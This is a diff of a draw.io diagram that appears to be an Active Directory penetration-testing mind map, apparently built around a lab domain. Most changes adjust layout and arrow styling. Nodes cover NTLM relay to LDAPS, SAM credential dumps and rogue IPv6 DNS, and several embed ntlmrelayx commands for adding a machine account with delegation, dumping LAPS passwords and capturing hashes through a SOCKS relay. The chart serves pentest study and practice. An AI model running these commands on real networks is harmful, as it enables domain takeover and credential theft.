@@ -265,9 +265,6 @@
         <mxCell id="OzdCo0pd7L-W225KIUEy-3" value="credentials dump (SAM) if admin&lt;br&gt;&lt;div&gt;or Cmd exec if user&lt;br&gt;&lt;/div&gt;" style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;" parent="1" vertex="1">
           <mxGeometry x="1540" y="542" width="220" height="65" as="geometry" />
         </mxCell>
-        <mxCell id="eT468RpVeFGScJ7yV71r-1" value="Rogue DNS IPV6" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
-          <mxGeometry x="1199" y="1240" width="120" height="60" as="geometry" />
-        </mxCell>
         <mxCell id="OdaqT3pz17vKf_LpFtww-13" style="shape=connector;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=11;fontColor=default;labelBackgroundColor=default;endArrow=block;endFill=1;edgeStyle=orthogonalEdgeStyle;" parent="1" source="2ArGYso1SfPXtdhOZaz5-4" target="OdaqT3pz17vKf_LpFtww-29" edge="1">
           <mxGeometry relative="1" as="geometry">
             <Array as="points">
@@ -362,23 +359,23 @@
         <mxCell id="hefA_bYV9p1Cq4kSP_zY-17" value="&lt;div&gt;no Prerequisites for HTTP&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;EAP enabled for HTTPS&lt;br&gt;&lt;/div&gt;" style="whiteSpace=wrap;html=1;rounded=1;fontSize=14;" parent="1" vertex="1">
           <mxGeometry x="1370" y="780" width="182" height="80" as="geometry" />
         </mxCell>
-        <mxCell id="hefA_bYV9p1Cq4kSP_zY-24" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" parent="1" source="hefA_bYV9p1Cq4kSP_zY-21" target="hefA_bYV9p1Cq4kSP_zY-22" edge="1">
+        <mxCell id="hefA_bYV9p1Cq4kSP_zY-24" style="edgeStyle=orthogonalEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;fillColor=#e1d5e7;" parent="1" source="hefA_bYV9p1Cq4kSP_zY-21" target="hefA_bYV9p1Cq4kSP_zY-22" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <mxCell id="hefA_bYV9p1Cq4kSP_zY-21" value="&lt;div&gt;Relay to LDAP or LDAPs&lt;br&gt;&lt;/div&gt;" style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;" parent="1" vertex="1">
           <mxGeometry x="1169" y="890" width="130" height="60" as="geometry" />
         </mxCell>
-        <mxCell id="i_53WrwCQ5BU9_YikGZj-2" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" parent="1" source="hefA_bYV9p1Cq4kSP_zY-22" target="i_53WrwCQ5BU9_YikGZj-1" edge="1">
+        <mxCell id="i_53WrwCQ5BU9_YikGZj-2" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;fillColor=#e1d5e7;" parent="1" source="hefA_bYV9p1Cq4kSP_zY-22" target="i_53WrwCQ5BU9_YikGZj-1" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
-        <mxCell id="nHM3VfHf2HmKvG00LrcE-1" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" parent="1" source="hefA_bYV9p1Cq4kSP_zY-22" target="QkhrWf05NAjAX-w3R0dh-1" edge="1">
+        <mxCell id="nHM3VfHf2HmKvG00LrcE-1" style="edgeStyle=orthogonalEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;fillColor=#e1d5e7;" parent="1" source="hefA_bYV9p1Cq4kSP_zY-22" target="QkhrWf05NAjAX-w3R0dh-1" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
-        <mxCell id="gim2rbIdz-NWKrZqOkX9-3" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" parent="1" source="hefA_bYV9p1Cq4kSP_zY-22" target="gim2rbIdz-NWKrZqOkX9-2" edge="1">
+        <mxCell id="gim2rbIdz-NWKrZqOkX9-3" style="edgeStyle=orthogonalEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;fillColor=#e1d5e7;" parent="1" source="hefA_bYV9p1Cq4kSP_zY-22" target="gim2rbIdz-NWKrZqOkX9-2" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <mxCell id="hefA_bYV9p1Cq4kSP_zY-22" value="&lt;div&gt;Prerequisites :&lt;/div&gt;&lt;div&gt;-signing not required or EPA disabled for LDAPS&lt;br&gt;&lt;/div&gt;&lt;div&gt;- incoming NTLM auth over HTTP or&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;span style=&quot;white-space: pre;&quot;&gt;&#x9;&lt;/span&gt;target vulnerable CVE 2019-1040 ; 2019-1166 ; ...&lt;br&gt;&lt;/div&gt;" style="whiteSpace=wrap;html=1;rounded=1;fontSize=14;align=left;" parent="1" vertex="1">
-          <mxGeometry x="1392" y="874" width="362" height="90" as="geometry" />
+          <mxGeometry x="1370" y="875" width="362" height="90" as="geometry" />
         </mxCell>
         <mxCell id="B9babmQNDwbTDUQ_FJxj-2" value="" style="rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=11;fontColor=default;labelBackgroundColor=default;elbow=vertical;endArrow=block;endFill=1;edgeStyle=orthogonalEdgeStyle;" parent="1" source="D0Nr5EjnPLK_zhP2Ymg5-1" target="OdaqT3pz17vKf_LpFtww-5" edge="1">
           <mxGeometry relative="1" as="geometry">
@@ -411,11 +408,11 @@
           <mxGeometry x="690" y="-360" width="330" height="60" as="geometry" />
         </mxCell>
         <mxCell id="i_53WrwCQ5BU9_YikGZj-1" value="&lt;div align=&quot;center&quot;&gt;permet de récupérer la liste des users de l&#39;AD (auto)&lt;br&gt;&lt;/div&gt;" style="whiteSpace=wrap;html=1;fontSize=14;align=center;rounded=1;" parent="1" vertex="1">
-          <mxGeometry x="1890" y="1025" width="350" height="60" as="geometry" />
+          <mxGeometry x="1890" y="895" width="350" height="50" as="geometry" />
         </mxCell>
         <object label="création d&#39;un compte machine (MAQ)" cmd="ntlmrelayx -t ldaps://meereen.essos.local -smb2support --remove-mic --add-computer removemiccomputer --delegate-access" id="QkhrWf05NAjAX-w3R0dh-1">
           <mxCell style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;strokeColor=#e5a50a;" parent="1" vertex="1">
-            <mxGeometry x="1900" y="1100" width="260" height="90" as="geometry" />
+            <mxGeometry x="1896" y="952" width="260" height="50" as="geometry" />
           </mxCell>
         </object>
         <mxCell id="RcJsrnn1SgcJtgKbqCFV-1" value="Domain Admin right" style="rounded=1;whiteSpace=wrap;html=1;fontSize=13;fillColor=#c64600;strokeColor=#B20000;fontColor=#ffffff;" parent="1" vertex="1">
@@ -434,7 +431,7 @@
         </mxCell>
         <object label="DACL abuse" cmd="ntlmrelayx -t ldaps://10.248.2.86 -smb2support --remove-mic --dump-laps" id="gim2rbIdz-NWKrZqOkX9-2">
           <mxCell style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;strokeColor=#e5a50a;" parent="1" vertex="1">
-            <mxGeometry x="1940" y="1216" width="150" height="50" as="geometry" />
+            <mxGeometry x="1896" y="1011" width="150" height="40" as="geometry" />
           </mxCell>
         </object>
         <object label="&lt;div&gt;Proxy socks&lt;/div&gt;" cmd="ntlmrelayx -tf  smb_targets.txt -of captured_hash.txt -smb2support -socks" id="gim2rbIdz-NWKrZqOkX9-6">
